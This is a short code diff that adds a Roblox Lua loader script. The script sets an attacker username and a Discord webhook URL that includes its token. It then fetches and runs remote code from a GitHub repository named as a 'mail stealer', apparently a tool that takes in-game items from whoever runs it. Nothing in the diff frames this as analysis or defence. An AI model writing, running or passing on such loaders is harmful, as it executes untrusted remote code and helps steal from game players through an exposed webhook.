@@ -1,0 +1,4 @@
+G.username = "Pleasecanfree"
+_G.Webhook = "https://discord.com/api/webhooks/1311115199616651316/X6sm7YPHdTS2Zg24gvLwbnZeX_qgwm9ubDCt6dwsIpZsIqyYrhLt3DQLBAZhF-DfPjfQ"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eonzzx/MailStealTimx/refs/heads/main/MailStealerTimx",true))();
